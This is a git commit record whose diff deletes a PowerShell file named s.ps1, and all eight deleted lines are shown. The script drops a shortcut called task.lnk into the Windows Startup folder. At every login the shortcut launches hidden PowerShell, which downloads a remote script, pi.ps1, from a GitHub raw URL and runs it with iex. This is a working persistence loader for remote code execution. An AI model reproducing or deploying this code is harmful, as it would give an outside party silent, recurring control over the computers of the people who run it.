e8f3165dfb3b334aa7fcfe0fbfd2efc7a781d6de
guilegel4 <guilegel4@mail.com>
2025-02-09 17:43:15 +0100

    Delete s.ps1

--- s.ps1
+++
@@ -1,8 +0,0 @@
-$cmd = 'powershell -WindowStyle Hidden -Command "iex (iwr "https://raw.githubusercontent.com/guilegel4/server/refs/heads/main/pi.ps1")"'
-$path = [System.Environment]::GetFolderPath('Startup') + "\task.lnk"
-$ws = New-Object -ComObject WScript.Shell
-$sc = $ws.CreateShortcut($path)
-$sc.TargetPath = "cmd.exe"
-$sc.Arguments = "/c $cmd"
-$sc.IconLocation = "cmd.exe"
-$sc.Save()
